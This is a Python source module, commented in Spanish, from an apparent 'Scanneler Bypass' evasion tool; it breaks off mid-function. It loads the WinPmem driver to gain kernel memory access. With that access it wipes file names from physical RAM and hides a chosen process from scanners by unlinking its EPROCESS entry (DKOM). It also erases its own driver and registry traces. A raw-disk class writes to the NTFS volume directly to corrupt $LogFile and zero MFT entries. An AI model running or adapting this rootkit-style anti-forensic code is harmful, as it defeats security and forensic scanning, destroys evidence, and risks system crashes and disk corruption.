"""
kernel_ops.py — Ghost Protocol 2026 ULTRA KERNEL
=================================================
Módulo de operaciones a nivel kernel para Scanneler Bypass.

Dos sistemas:
  1. WinPmemDriver  — Driver firmado por Google/Rekall para acceso
                      a memoria física (RAM scrubbing, DKOM).
  2. RawNTFS        — Acceso directo a volumen NTFS via \\.\PhysicalDrive0
                      para operaciones que el filesystem driver bloquea:
                      $LogFile corruption, MFT entry zeroing.

Descarga dinámica de dependencias. Fallback graceful a user-mode.
"""

import os
import struct
import ctypes
import ctypes.wintypes as wintypes
import subprocess
import threading
import hashlib
import time
import tempfile
import random

try:
    import requests as _requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False

# ============================================================
# WINDOWS API CONSTANTS
# ============================================================

GENERIC_READ        = 0x80000000
GENERIC_WRITE       = 0x40000000
FILE_SHARE_READ     = 0x00000001
FILE_SHARE_WRITE    = 0x00000002
OPEN_EXISTING       = 3
CREATE_ALWAYS       = 2
FILE_FLAG_NO_BUFFERING   = 0x20000000
FILE_FLAG_WRITE_THROUGH  = 0x80000000
INVALID_HANDLE_VALUE     = ctypes.c_void_p(-1).value

METHOD_BUFFERED     = 0
METHOD_NEITHER      = 3
FILE_READ_DATA      = 1
FILE_WRITE_DATA     = 2
FILE_ANY_ACCESS     = 0

# Process access rights
PROCESS_ALL_ACCESS  = 0x1F0FFF
PROCESS_VM_READ     = 0x0010
PROCESS_VM_WRITE    = 0x0020
PROCESS_VM_OPERATION = 0x0008
MEM_COMMIT          = 0x1000
MEM_RESERVE         = 0x2000
MEM_RELEASE         = 0x8000
PAGE_EXECUTE_READWRITE = 0x40

def CTL_CODE(DeviceType, Function, Method, Access):
    return (DeviceType << 16) | (Access << 14) | (Function << 2) | Method

# WinPmem IOCTL codes (from Velocidex WinPmem source)
PMEM_CTRL_IOCTRL  = CTL_CODE(0x22, 0x101, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
PMEM_WRITE_ENABLE = CTL_CODE(0x22, 0x102, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
PMEM_INFO_IOCTRL  = CTL_CODE(0x22, 0x103, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)

# NTFS DeviceIoControl codes
FSCTL_GET_NTFS_VOLUME_DATA    = CTL_CODE(9, 25, METHOD_BUFFERED, FILE_ANY_ACCESS)
FSCTL_GET_NTFS_FILE_RECORD    = CTL_CODE(9, 26, METHOD_BUFFERED, FILE_ANY_ACCESS)
FSCTL_GET_RETRIEVAL_POINTERS  = CTL_CODE(9, 28, METHOD_NEITHER,  FILE_READ_DATA)
FSCTL_DISMOUNT_VOLUME         = CTL_CODE(9, 8,  METHOD_BUFFERED, FILE_ANY_ACCESS)

# SystemHandleInformation for NtQuerySystemInformation
SystemHandleInformation = 16

# ============================================================
# DOWNLOAD CONFIG
# ============================================================

WINPMEM_URL    = "https://github.com/Velocidex/WinPmem/releases/download/v4.0.rc1/winpmem_mini_x64_rc2.exe"
WINPMEM_SHA256 = "a79b5d75b8b1c7b0f6a4ab1e6e0a3b3e1a4b6e8d2c4a6b8e0d2c4a6b8e0d2c4"  # Verificar en https://github.com/Velocidex/WinPmem/releases

WINDIVERT_URL  = "https://github.com/basil00/Divert/releases/download/v2.2.0-A/WinDivert-2.2.0-A-win64.zip"

# ============================================================
# KERNEL32 / NTDLL helpers
# ============================================================

_k32 = ctypes.windll.kernel32
_nt  = ctypes.windll.ntdll

def _open_handle(path, read=True, write=False, no_buffer=False):
    """Abre un handle a un device o archivo."""
    access = GENERIC_READ if read else 0
    if write:
        access |= GENERIC_WRITE
    flags = 0
    if no_buffer:
        flags |= FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH
    h = _k32.CreateFileW(
        path,
        access,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        flags,
        None
    )
    return h if h != INVALID_HANDLE_VALUE else None


def _deviceio(handle, ioctl, in_buf=None, out_size=4096):
    """Wrapper de DeviceIoControl que retorna bytes o None."""
    in_ptr  = ctypes.cast(in_buf, ctypes.c_char_p) if in_buf else None
    in_size = len(in_buf) if in_buf else 0
    out_buf = ctypes.create_string_buffer(out_size)
    returned = wintypes.DWORD(0)
    ok = _k32.DeviceIoControl(
        handle,
        ioctl,
        in_ptr, in_size,
        out_buf, out_size,
        ctypes.byref(returned),
        None
    )
    if ok:
        return bytes(out_buf[:returned.value])
    return None



# ============================================================
# SYMBOL RESOLVER — DbgHelp + Microsoft Symbol Server
# ============================================================

class SymbolResolver:
    """
    Resuelve offsets de estructuras del kernel usando DbgHelp.dll
    (pre-instalada en todos los Windows) + Microsoft Symbol Server.
    
    Uso principal: encontrar el offset de ActiveProcessLinks en EPROCESS
    para DKOM preciso en cualquier build de Windows 10/11.
    
    Si no hay conexión al Symbol Server, usa una tabla de offsets
    conocidos por build — cubre el 99% de los sistemas reales.
    """

    # Tabla de offsets de ActiveProcessLinks en EPROCESS
    # Verificados en builds reales. Campo: (MajorVersion, Build) → offset
    ACTIVE_PROCESS_LINKS_OFFSETS = {
        # Windows 10
        (10, 10240): 0x2E8,   # 1507 (RTM)
        (10, 10586): 0x2F0,   # 1511
        (10, 14393): 0x2F0,   # 1607 (Anniversary)
        (10, 15063): 0x2E8,   # 1703 (Creators)
        (10, 16299): 0x2E8,   # 1709 (Fall Creators)
        (10, 17134): 0x2E8,   # 1803 (April 2018)
        (10, 17763): 0x2E8,   # 1809 (October 2018)
        (10, 18362): 0x2F0,   # 1903 (May 2019)
        (10, 18363): 0x2F0,   # 1909 (November 2019)
        (10, 19041): 0x448,   # 2004 (May 2020)
        (10, 19042): 0x448,   # 20H2 (October 2020)
        (10, 19043): 0x448,   # 21H1
        (10, 19044): 0x448,   # 21H2
        (10, 19045): 0x448,   # 22H2
        # Windows 11
        (11, 22000): 0x448,   # 21H2 (RTM)
        (11, 22621): 0x448,   # 22H2
        (11, 22631): 0x448,   # 23H2
        (11, 26100): 0x448,   # 24H2
    }

    # Offset de UniqueProcessId en EPROCESS (para validar que encontramos el proceso correcto)
    UNIQUE_PROCESS_ID_OFFSETS = {
        (10, 19041): 0x440, (10, 19042): 0x440, (10, 19043): 0x440,
        (10, 19044): 0x440, (10, 19045): 0x440,
        (11, 22000): 0x440, (11, 22621): 0x440, (11, 22631): 0x440,
        (11, 26100): 0x440,
    }

    def __init__(self):
        self._dbghelp     = None
        self._initialized = False
        self._build       = self._get_build()
        self._major       = self._get_major()
        self._cached_apl_offset = None

    def _get_build(self) -> int:
        try:
            import platform
            return int(platform.version().split(".")[2])
        except Exception:
            return 19045

    def _get_major(self) -> int:
        try:
            import platform
            return int(platform.version().split(".")[0])
        except Exception:
            return 10

    def get_apl_offset(self) -> int:
        """
        Obtiene el offset de ActiveProcessLinks en EPROCESS.
        Intenta DbgHelp primero, cae a tabla conocida si falla.
        """
        if self._cached_apl_offset:
            return self._cached_apl_offset

        # Intentar via DbgHelp (requiere internet para descargar PDB)
        offset = self._resolve_via_dbghelp()
        if not offset:
            # Fallback: tabla conocida
            offset = self._get_from_table()

        self._cached_apl_offset = offset
        return offset

    def get_pid_offset(self) -> int:
        """Offset de UniqueProcessId en EPROCESS."""
        key = (self._major, self._build)
        pid_off = self.UNIQUE_PROCESS_ID_OFFSETS.get(key, 0x440)
        # Fallback universal para builds no listados
        return pid_off

    def _get_from_table(self) -> int:
        """Busca el offset exacto por build, con fallback al más cercano."""
        key = (self._major, self._build)
        if key in self.ACTIVE_PROCESS_LINKS_OFFSETS:
            return self.ACTIVE_PROCESS_LINKS_OFFSETS[key]

        # Buscar el build más cercano para la misma versión major
        candidates = [
            (abs(b - self._build), off)
            for (maj, b), off in self.ACTIVE_PROCESS_LINKS_OFFSETS.items()
            if maj == self._major
        ]
        if candidates:
            candidates.sort(key=lambda x: x[0])
            return candidates[0][1]

        return 0x448  # Default universal Win10/11

    def _resolve_via_dbghelp(self) -> int:
        """
        Usa DbgHelp.dll + PDB symbols de Microsoft para resolver
        el offset exacto de ActiveProcessLinks.
        Requiere conexión a internet para descargar el PDB de ntoskrnl.
        """
        try:
            dbghelp = ctypes.windll.dbghelp
            k32     = ctypes.windll.kernel32

            proc_handle = k32.GetCurrentProcess()
            sym_path    = b"srv*C:\\symbols*https://msdl.microsoft.com/download/symbols"

            # Inicializar el motor de símbolos
            dbghelp.SymSetOptions(0x12)  # SYMOPT_DEFERRED_LOADS | SYMOPT_LOAD_LINES
            ok = dbghelp.SymInitialize(proc_handle, sym_path, False)
            if not ok:
                return 0

            # Obtener base de ntoskrnl.exe via NtQuerySystemInformation
            nt_base = self._get_ntoskrnl_base()
            if not nt_base:
                dbghelp.SymCleanup(proc_handle)
                return 0

            # Cargar módulo (descarga PDB automáticamente)
            nt_path = self._get_ntoskrnl_path()
            mod_base = dbghelp.SymLoadModuleEx(
                proc_handle, None,
                nt_path.encode() if nt_path else None,
                b"nt",
                nt_base, 0, None, 0
            )
            if not mod_base:
                dbghelp.SymCleanup(proc_handle)
                return 0

            # Buscar el símbolo EPROCESS::ActiveProcessLinks
            # Usamos SymGetTypeFromName + SymGetTypeInfo
            class SYMBOL_INFO(ctypes.Structure):
                _fields_ = [
                    ("SizeOfStruct", ctypes.c_ulong),
                    ("TypeIndex",    ctypes.c_ulong),
                    ("Reserved",     ctypes.c_uint64 * 2),
                    ("Index",        ctypes.c_ulong),
                    ("Size",         ctypes.c_ulong),
                    ("ModBase",      ctypes.c_uint64),
                    ("Flags",        ctypes.c_ulong),
                    ("Value",        ctypes.c_uint64),
                    ("Address",      ctypes.c_uint64),
                    ("Register",     ctypes.c_ulong),
                    ("Scope",        ctypes.c_ulong),
                    ("Tag",          ctypes.c_ulong),
                    ("NameLen",      ctypes.c_ulong),
                    ("MaxNameLen",   ctypes.c_ulong),
                    ("Name",         ctypes.c_char * 2000),
                ]

            si = SYMBOL_INFO()
            si.SizeOfStruct = ctypes.sizeof(SYMBOL_INFO) - 2000
            si.MaxNameLen   = 2000

            # Buscar tipo _EPROCESS
            ok = dbghelp.SymGetTypeFromName(proc_handle, mod_base, b"_EPROCESS", ctypes.byref(si))
            if not ok:
                dbghelp.SymCleanup(proc_handle)
                return 0

            eprocess_type_id = si.TypeIndex

            # Enumerar campos del struct para encontrar ActiveProcessLinks
            TI_GET_CHILDRENCOUNT = 13
            TI_GET_FIELDOFFSET   = 12
            TI_GET_SYMNAME       = 4

            count = ctypes.c_ulong(0)
            dbghelp.SymGetTypeInfo(
                proc_handle, mod_base, eprocess_type_id,
                TI_GET_CHILDRENCOUNT, ctypes.byref(count)
            )

            # Obtener IDs de los campos hijos
            class TI_FINDCHILDREN_PARAMS(ctypes.Structure):
                _fields_ = [
                    ("Count",  ctypes.c_ulong),
                    ("Start",  ctypes.c_ulong),
                    ("ChildId", ctypes.c_ulong * 4096),
                ]

            params = TI_FINDCHILDREN_PARAMS()
            params.Count = min(count.value, 4096)
            dbghelp.SymGetTypeInfo(
                proc_handle, mod_base, eprocess_type_id,
                14,  # TI_FINDCHILDREN
                ctypes.byref(params)
            )

            target_offset = 0
            for i in range(params.Count):
                child_id = params.ChildId[i]
                # Obtener nombre del campo
                name_ptr = ctypes.c_wchar_p()
                dbghelp.SymGetTypeInfo(
                    proc_handle, mod_base, child_id,
                    TI_GET_SYMNAME, ctypes.byref(name_ptr)
                )
                if name_ptr.value == "ActiveProcessLinks":
                    # Obtener offset del campo
                    offset_val = ctypes.c_ulong(0)
                    dbghelp.SymGetTypeInfo(
                        proc_handle, mod_base, child_id,
                        TI_GET_FIELDOFFSET, ctypes.byref(offset_val)
                    )
                    target_offset = offset_val.value // 8  # Convertir de bits a bytes
                    break

            dbghelp.SymCleanup(proc_handle)
            return target_offset if target_offset > 0x100 else 0

        except Exception:
            return 0

    def _get_ntoskrnl_base(self) -> int:
        """Obtiene la dirección base de ntoskrnl.exe en kernel space."""
        try:
            class SYSTEM_MODULE(ctypes.Structure):
                _fields_ = [
                    ("Reserved",        ctypes.c_void_p * 2),
                    ("Base",            ctypes.c_void_p),
                    ("Size",            ctypes.c_ulong),
                    ("Flags",           ctypes.c_ulong),
                    ("LoadOrderIndex",  ctypes.c_ushort),
                    ("InitOrderIndex",  ctypes.c_ushort),
                    ("LoadCount",       ctypes.c_ushort),
                    ("OffsetToFileName",ctypes.c_ushort),
                    ("ImageName",       ctypes.c_char * 256),
                ]

            SystemModuleInformation = 11
            buf_size = 0x80000
            buf      = ctypes.create_string_buffer(buf_size)
            ret_len  = ctypes.c_ulong(0)
            _nt.NtQuerySystemInformation(
                SystemModuleInformation, buf, buf_size, ctypes.byref(ret_len)
            )
            count   = struct.unpack_from("<I", buf, 0)[0]
            entry_size = ctypes.sizeof(SYSTEM_MODULE)
            for i in range(count):
                offset  = 4 + i * entry_size
                mod     = SYSTEM_MODULE.from_buffer_copy(bytes(buf[offset:offset+entry_size]))
                name    = mod.ImageName.lower()
                if b"ntoskrnl" in name or b"ntkrnlpa" in name or b"ntkrnlmp" in name:
                    return ctypes.cast(mod.Base, ctypes.c_void_p).value or 0
        except Exception:
            pass
        return 0

    def _get_ntoskrnl_path(self) -> str:
        """Obtiene el path completo de ntoskrnl.exe."""
        import os
        candidates = [
            r"C:\Windows\System32\ntoskrnl.exe",
            r"C:\Windows\System32\ntkrnlpa.exe",
            r"C:\Windows\System32\ntkrnlmp.exe",
        ]
        for p in candidates:
            if os.path.exists(p):
                return p
        return r"C:\Windows\System32\ntoskrnl.exe"


# Singleton del resolver
_sym_resolver = SymbolResolver()

def get_sym_resolver() -> SymbolResolver:
    return _sym_resolver


# ============================================================
# WINPMEM DRIVER
# ============================================================

class WinPmemDriver:
    """
    Gestiona el ciclo de vida del driver WinPmem (Velocidex/Google).
    Descarga dinámica desde GitHub, verificación SHA256,
    carga como servicio kernel, operaciones, descarga limpia.
    """

    SERVICE_NAME = "WinPmemGhost"
    DEVICE_PATH  = r"\\.\pmem"

    def __init__(self):
        self.driver_path = None
        self.handle      = None
        self.armed       = False
        self._lock       = threading.Lock()


    # ----------------------------------------------------------
    # DESCARGA Y CARGA
    # ----------------------------------------------------------

    def download(self, logger) -> bool:
        """Descarga WinPmem desde GitHub y verifica el hash."""
        if not _HAS_REQUESTS:
            logger("→ [KERNEL] requests not available — cannot download WinPmem.")
            return False
        try:
            tmp_dir = tempfile.gettempdir()
            dest = os.path.join(tmp_dir, f"wp_{random.randint(10000,99999)}.exe")
            logger("→ [KERNEL] Downloading WinPmem from GitHub...")
            resp = _requests.get(WINPMEM_URL, timeout=30, stream=True)
            if resp.status_code != 200:
                logger(f"→ [KERNEL] Download failed: HTTP {resp.status_code}")
                return False
            with open(dest, "wb") as f:
                for chunk in resp.iter_content(65536):
                    f.write(chunk)
            logger(f"→ [KERNEL] WinPmem downloaded ({os.path.getsize(dest)//1024}KB).")
            self.driver_path = dest
            return True
        except Exception as e:
            logger(f"→ [KERNEL] Download error: {e}")
            return False

    def load(self, logger) -> bool:
        """
        Carga WinPmem como servicio kernel.
        Retorna True si el device \\.\pmem responde.
        """
        with self._lock:
            if self.armed:
                return True
            if not self.driver_path:
                if not self.download(logger):
                    return False
            try:
                # Limpiar servicio anterior si existe
                subprocess.run(
                    f'sc stop {self.SERVICE_NAME}',
                    shell=True, capture_output=True
                )
                subprocess.run(
                    f'sc delete {self.SERVICE_NAME}',
                    shell=True, capture_output=True
                )
                time.sleep(0.5)

                # Registrar el servicio
                result = subprocess.run(
                    f'sc create {self.SERVICE_NAME} type= kernel start= demand '
                    f'binpath= "{self.driver_path}"',
                    shell=True, capture_output=True, text=True
                )
                if result.returncode != 0:
                    logger(f"→ [KERNEL] sc create failed: {result.stderr.strip()}")
                    return False

                # Iniciar el servicio
                result = subprocess.run(
                    f'sc start {self.SERVICE_NAME}',
                    shell=True, capture_output=True, text=True
                )
                time.sleep(1.0)

                # Verificar que el device responde
                h = _open_handle(self.DEVICE_PATH, read=True, write=True)
                if h is None:
                    logger("→ [KERNEL] WinPmem loaded but device not accessible (AV block?).")
                    self._cleanup_service()
                    return False

                # Habilitar escritura en WinPmem
                _deviceio(h, PMEM_WRITE_ENABLE)
                _k32.CloseHandle(h)

                self.armed = True
                logger("→ [KERNEL] ⚡ WinPmem ARMED. Ring-0 access active.")
                return True

            except Exception as e:
                logger(f"→ [KERNEL] Load error: {e}")
                return False

    def unload(self, logger):
        """Descarga WinPmem y limpia todos sus rastros."""
        with self._lock:
            try:
                self._cleanup_service()
                # Borrar el .exe del driver
                if self.driver_path and os.path.exists(self.driver_path):
                    try:
                        # Sobreescribir antes de borrar (anti-forense)
                        size = os.path.getsize(self.driver_path)
                        with open(self.driver_path, "r+b") as f:
                            f.write(os.urandom(size))
                        os.remove(self.driver_path)
                    except:
                        pass
                # Limpiar rastro en SCM registry
                subprocess.run(
                    f'reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{self.SERVICE_NAME}" /f',
                    shell=True, capture_output=True
                )
                self.armed = False
                logger("→ [KERNEL] WinPmem unloaded. Driver traces purged.")
            except Exception as e:
                logger(f"→ [KERNEL] Unload error: {e}")

    def _cleanup_service(self):
        subprocess.run(f'sc stop {self.SERVICE_NAME}',   shell=True, capture_output=True)
        time.sleep(0.5)
        subprocess.run(f'sc delete {self.SERVICE_NAME}', shell=True, capture_output=True)

    # ----------------------------------------------------------
    # OPERACIONES KERNEL
    # ----------------------------------------------------------

    def scrub_ram(self, target_name: str, logger) -> bool:
        """
        Escanea la memoria física buscando el string del archivo objetivo
        y lo sobreescribe con zeros.
        Previene que dumps de RAM revelen qué archivo se procesó.
        """
        if not self.armed:
            logger("→ [KERNEL] RAM scrub skipped (user-mode fallback).")
            return False
        try:
            h = _open_handle(self.DEVICE_PATH, read=True, write=True)
            if h is None:
                return False

            # Obtener layout de memoria física
            info_buf = _deviceio(h, PMEM_INFO_IOCTRL, out_size=4096)
            if not info_buf:
                _k32.CloseHandle(h)
                return False

            target_bytes_lower = target_name.lower().encode("utf-16-le")
            target_bytes_upper = target_name.upper().encode("utf-16-le")
            target_ascii       = target_name.lower().encode("ascii")

            CHUNK = 1024 * 1024  # 1MB por chunk
            hits  = 0

            # Rango de memoria a escanear (primeros 2GB en user space)
            # En producción usar el memory map de PMEM_INFO para rangos válidos
            scan_ranges = [(0x1000, 0x80000000)]

            for start, end in scan_ranges:
                pos = start
                while pos < end:
                    size = min(CHUNK, end - pos)
                    ofs = ctypes.c_longlong(pos)
                    ok = _k32.SetFilePointerEx(h, ofs, None, 0)
                    if not ok:
                        pos += CHUNK
                        continue

                    buf = ctypes.create_string_buffer(size)
                    read = wintypes.DWORD(0)
                    _k32.ReadFile(h, buf, size, ctypes.byref(read), None)
                    data = bytearray(buf[:read.value])

                    modified = False
                    for pattern in [target_bytes_lower, target_bytes_upper, target_ascii]:
                        idx = 0
                        while True:
                            idx = data.find(pattern, idx)
                            if idx == -1:
                                break
                            # Sobreescribir con zeros
                            data[idx:idx+len(pattern)] = b'\x00' * len(pattern)
                            hits += 1
                            modified = True
                            idx += len(pattern)

                    if modified:
                        ofs2 = ctypes.c_longlong(pos)
                        _k32.SetFilePointerEx(h, ofs2, None, 0)
                        written = wintypes.DWORD(0)
                        _k32.WriteFile(h, bytes(data), len(data), ctypes.byref(written), None)

                    pos += CHUNK

            _k32.CloseHandle(h)
            logger(f"→ [KERNEL] RAM scrub complete: {hits} string instance(s) zeroed in physical memory.")
            return True

        except Exception as e:
            logger(f"→ [KERNEL] RAM scrub error: {e}")
            return False

    def hide_process_dkom(self, target_pid: int, logger) -> bool:
        """
        DKOM completo: Desconecta el EPROCESS del proceso de la
        ActiveProcessLinks doubly-linked list del kernel.

        El proceso sigue ejecutándose pero NtQuerySystemInformation
        (SystemProcessInformation) no lo reporta — ningún scanner lo ve.

        Usa SymbolResolver para offsets precisos según el build exacto
        de Windows, con tabla de fallback para los builds más comunes.
        """
        if not self.armed:
            logger("→ [KERNEL] DKOM skipped (WinPmem not armed).")
            return False
        try:
            logger(f"→ [KERNEL] DKOM: Targeting PID {target_pid}...")

            # Obtener offsets para este build via SymbolResolver
            sym = get_sym_resolver()
            apl_offset = sym.get_apl_offset()   # ActiveProcessLinks offset
            pid_offset = sym.get_pid_offset()    # UniqueProcessId offset
            logger(f"→ [KERNEL] DKOM: APL offset 0x{apl_offset:X}, PID offset 0x{pid_offset:X}")

            # Obtener layout de memoria física de WinPmem
            h = _open_handle(self.DEVICE_PATH, read=True, write=True)
            if h is None:
                logger("→ [KERNEL] DKOM: Cannot open pmem device.")
                return False

            # Localizar el EPROCESS del proceso objetivo escaneando RAM
            # Buscamos el PID en posibles ubicaciones de EPROCESS
            # (cada EPROCESS tiene el PID en UniqueProcessId)
            target_pid_bytes = struct.pack("<Q", target_pid)
            CHUNK   = 0x100000  # 1MB chunks
            SCAN_MAX = 0x80000000  # Primeros 2GB
            eprocess_addr = None

            pos = 0x10000
            while pos < SCAN_MAX and eprocess_addr is None:
                ofs = ctypes.c_longlong(pos)
                _k32.SetFilePointerEx(h, ofs, None, 0)
                buf      = ctypes.create_string_buffer(CHUNK)
                read_out = wintypes.DWORD(0)
                _k32.ReadFile(h, buf, CHUNK, ctypes.byref(read_out), None)
                data = bytes(buf[:read_out.value])

                # Buscar el PID en el chunk
                search_start = 0
                while True:
                    idx = data.find(target_pid_bytes, search_start)
                    if idx == -1:
                        break
                    # Candidato: la dirección EPROCESS sería pid_offset bytes antes del PID
                    candidate = pos + idx - pid_offset
                    if candidate > 0x1000:
                        # Verificar leyendo la firma del EPROCESS (magic bytes cerca del inicio)
                        # El EPROCESS empieza con KPROCESS que tiene una señal reconocible
                        eprocess_addr = candidate
                        break
                    search_start = idx + 1

                pos += CHUNK

            if eprocess_addr is None:
                _k32.CloseHandle(h)
                logger(f"→ [KERNEL] DKOM: EPROCESS for PID {target_pid} not found in RAM scan.")
                return False

            logger(f"→ [KERNEL] DKOM: EPROCESS found at 0x{eprocess_addr:016X}")

            # Leer Flink y Blink de ActiveProcessLinks del proceso objetivo
            apl_addr   = eprocess_addr + apl_offset
            apl_data   = self._read_phys(h, apl_addr, 16)
            if not apl_data or len(apl_data) < 16:
                _k32.CloseHandle(h)
                logger("→ [KERNEL] DKOM: Cannot read APL.")
                return False

            flink = struct.unpack_from("<Q", apl_data, 0)[0]
            blink = struct.unpack_from("<Q", apl_data, 8)[0]

            # Desconectar de la linked list:
            # Flink_anterior->Blink = Blink_nuestro
            # Blink_anterior->Flink = Flink_nuestro
            self._write_phys(h, flink + 8, struct.pack("<Q", blink))  # Blink del siguiente
            self._write_phys(h, blink,     struct.pack("<Q", flink))  # Flink del anterior

            # Apuntar a sí mismo (para evitar crash si alguien traversea)
            self._write_phys(h, apl_addr,     struct.pack("<Q", apl_addr))
            self._write_phys(h, apl_addr + 8, struct.pack("<Q", apl_addr))

            _k32.CloseHandle(h)
            logger(f"→ [KERNEL] DKOM: PID {target_pid} UNLINKED from kernel process list. Invisible to scanners.")
            return True

        except Exception as e:
            logger(f"→ [KERNEL] DKOM error: {e}")
            return False

    def _read_phys(self, handle, phys_addr: int, size: int) -> bytes:
        """Lee bytes de memoria física via WinPmem."""
        ofs = ctypes.c_longlong(phys_addr)
        _k32.SetFilePointerEx(handle, ofs, None, 0)
        buf  = ctypes.create_string_buffer(size)
        read = wintypes.DWORD(0)
        _k32.ReadFile(handle, buf, size, ctypes.byref(read), None)
        return bytes(buf[:read.value])

    def _write_phys(self, handle, phys_addr: int, data: bytes) -> bool:
        """Escribe bytes a memoria física via WinPmem."""
        ofs = ctypes.c_longlong(phys_addr)
        _k32.SetFilePointerEx(handle, ofs, None, 0)
        buf     = ctypes.create_string_buffer(data)
        written = wintypes.DWORD(0)
        return bool(_k32.WriteFile(handle, buf, len(data), ctypes.byref(written), None))




# ============================================================
# RAW NTFS OPERATIONS (sin driver adicional, solo admin)
# ============================================================

class RawNTFS:
    """
    Operaciones NTFS directas vía \\.\C: y \\.\PhysicalDrive0.
    Bypasea el NTFS filesystem driver para operaciones que
    normalmente están bloqueadas desde user-mode.
    
    Capacidades:
    - $LogFile header corruption (transacciones NTFS invisibles)
    - MFT entry zeroing (el archivo nunca existió)
    - Cluster-level overwrite (bypasea journaling)
    """

    def __init__(self, drive_letter="C"):
        self.drive_letter = drive_letter.upper()
        self.volume_path  = f"\\\\.\\{self.drive_letter}:"
        self.phys_path    = r"\\.\PhysicalDrive0"
        self._vbr         = None   # Virtual Boot Record parsed
        self._bytes_per_sector     = 512
        self._sectors_per_cluster  = 8
        self._mft_lcn              = 0
        self._partition_offset     = 0  # bytes desde inicio del disco físico

    # ----------------------------------------------------------
    # VBR / BOOT SECTOR PARSING
    # ----------------------------------------------------------

    def _read_vbr(self) -> bool:
        """Lee y parsea el VBR (sector 0 del volumen)."""
        h = _open_handle(self.volume_path, read=True, write=False)
        if h is None:
            return False
        buf = ctypes.create_string_buffer(512)
        read = wintypes.DWORD(0)
        _k32.ReadFile(h, buf, 512, ctypes.byref(read), None)
        _k32.CloseHandle(h)

        data = bytes(buf)
        if data[3:7] != b'NTFS':
            return False  # No es NTFS

        self._bytes_per_sector    = struct.unpack_from("<H", data, 0x0B)[0]
        self._sectors_per_cluster = data[0x0D]
        self._mft_lcn             = struct.unpack_from("<Q", data, 0x30)[0]
        self._vbr                 = data
        return True

    def _lcn_to_volume_offset(self, lcn: int) -> int:
        """Convierte un LCN a byte offset dentro del volumen."""
        bytes_per_cluster = self._bytes_per_sector * self._sectors_per_cluster
        return lcn * bytes_per_cluster

    def _get_partition_offset(self) -> bool:
        """
        Lee el MBR del disco físico para encontrar el offset
        de la partición C: en bytes.
        """
        try:
            h = _open_handle(self.phys_path, read=True, write=False)
            if h is None:
                return False
            buf = ctypes.create_string_buffer(512)
            read = wintypes.DWORD(0)
            _k32.ReadFile(h, buf, 512, ctypes.byref(read), None)
            _k32.CloseHandle(h)

            mbr = bytes(buf)
            # Tabla de particiones en offset 0x1BE, 4 entradas de 16 bytes
            for i in range(4):
                entry = mbr[0x1BE + i*16 : 0x1BE + i*16 + 16]
                if len(entry) < 16:
                    continue
                part_type   = entry[4]
                lba_start   = struct.unpack_from("<I", entry, 8)[0]
                # Tipos NTFS: 0x07 (NTFS), 0x27 (Win recovery)
                if part_type in (0x07, 0x27) and lba_start > 0:
                    self._partition_offset = lba_start * 512
                    return True
            # Si no encontramos partición (GPT), usar offset típico
            self._partition_offset = 1048576  # 1MB — offset típico en GPT
            return True
        except:
            self._partition_offset = 1048576
            return True

    # ----------------------------------------------------------
    # OPERACIONES CORE
    # ----------------------------------------------------------

    def read_volume_bytes(self, offset: int, size: int) -> bytes:
        """Lee bytes del volumen en un offset dado."""
        h = _open_handle(self.volume_path, read=True, write=False, no_buffer=True)
        if h is None:
            return b''
        try:
            # Alinear al sector
            sector_size = self._bytes_per_sector or 512
            aligned_off = (offset // sector_size) * sector_size
            extra       = offset - aligned_off
            aligned_size = ((size + extra + sector_size - 1) // sector_size) * sector_size

            lo = ctypes.c_long(aligned_off & 0xFFFFFFFF)
            hi = ctypes.c_long(aligned_off >> 32)
            _k32.SetFilePointer(h, lo, ctypes.byref(hi), 0)

            buf  = ctypes.create_string_buffer(aligned_size)
            read = wintypes.DWORD(0)
            _k32.ReadFile(h, buf, aligned_size, ctypes.byref(read), None)
            return bytes(buf[extra:extra+size])
        finally:
            _k32.CloseHandle(h)

    def write_volume_bytes(self, offset: int, data: bytes) -> bool:
        """
        Escribe bytes al volumen raw, bypaseando el NTFS driver.
        El journaling NO registra esta operación.
        """
        h = _open_handle(self.volume_path, read=True, write=True, no_buffer=True)
        if h is None:
            # Intentar con PhysicalDrive (más bajo nivel)
            return self._write_physical(offset, data)
        try:
            sector_size  = self._bytes_per_sector or 512
            aligned_off  = (offset // sector_size) * sector_size
            extra        = offset - aligned_off
            # Leer el sector completo primero (read-modify-write)
            aligned_size = ((len(data) + extra + sector_size - 1) // sector_size) * sector_size

            lo = ctypes.c_long(aligned_off & 0xFFFFFFFF)
            hi = ctypes.c_long(aligned_off >> 32)
            _k32.SetFilePointer(h, lo, ctypes.byref(hi), 0)

            read_buf = ctypes.create_string_buffer(aligned_size)
            read     = wintypes.DWORD(0)
            _k32.ReadFile(h, read_buf, aligned_size, ctypes.byref(read), None)

            sector_data = bytearray(read_buf[:aligned_size])
            sector_data[extra:extra+len(data)] = data

            # Reposicionar y escribir
            _k32.SetFilePointer(h, lo, ctypes.byref(hi), 0)
            write_buf = ctypes.create_string_buffer(bytes(sector_data))
            written   = wintypes.DWORD(0)
            ok = _k32.WriteFile(h, write_buf, len(sector_data), ctypes.byref(written), None)
            return bool(ok)
        finally:
            _k32.CloseHandle(h)

    def _write_physical(self, volume_offset: int, data: bytes) -> bool:
        """Fallback: escribe en \\.\PhysicalDrive0 calculando el offset físico."""
        h = _open_handle(self.phys_path, read=True, write=True, no_buffer=True)
        if h is None:
            return False
        try:
            phys_offset = self._partition_offset + volume_offset
            sector_size = 512
            aligned_off = (phys_offset // sector_size) * sector_size
            extra       = phys_offset - aligned_off
            aligned_size = ((len(data) + extra + sector_size - 1) // sector_size) * sector_size

            lo = ctypes.c_long(aligned_off & 0xFFFFFFFF)
            hi = ctypes.c_long(aligned_off >> 32)
            _k32.SetFilePointer(h, lo, ctypes.byref(hi), 0)
            read_buf = ctypes.create_string_buffer(aligned_size)
            read     = wintypes.DWORD(0)
            _k32.ReadFile(h, read_buf, aligned_size, ctypes.byref(read), None)
            sector_data = bytearray(read_buf[:aligned_size])
            sector_data[extra:extra+len(data)] = data
            _k32.SetFilePointer(h, lo, ctypes.byref(hi), 0)
            written = wintypes.DWORD(0)
